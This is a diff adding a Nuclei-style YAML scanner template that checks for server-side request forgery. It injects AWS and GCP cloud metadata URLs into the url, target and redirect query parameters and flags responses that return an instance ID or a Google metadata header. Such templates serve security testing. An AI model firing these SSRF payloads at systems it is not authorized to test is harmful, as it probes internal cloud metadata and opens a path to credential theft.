@@ -1,0 +1,37 @@
+id: nawab-confirmed-ssrf
+
+info:
+  name: 🛸 Nawab-Confirmed-SSRF 🛸
+  author: thenawabx
+  severity: critical
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      ssrf_targets:
+        - "http://169.254.169.254/latest/meta-data/instance-id"
+        - "http://metadata.google.internal/computeMetadata/v1/instance/id"
+
+    fuzzing:
+      - part: query
+        keys: ["url", "target", "redirect"]
+        type: replace
+        fuzz:
+          - "{{ssrf_targets}}"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: aws-confirmed
+        regex:
+          - "^i-[a-f0-9]{8,17}$" # Actual AWS Instance ID format
+        part: body
+
+      - type: word
+        name: gcp-confirmed
+        words:
+          - "Metadata-Flavor: Google"
+        part: header
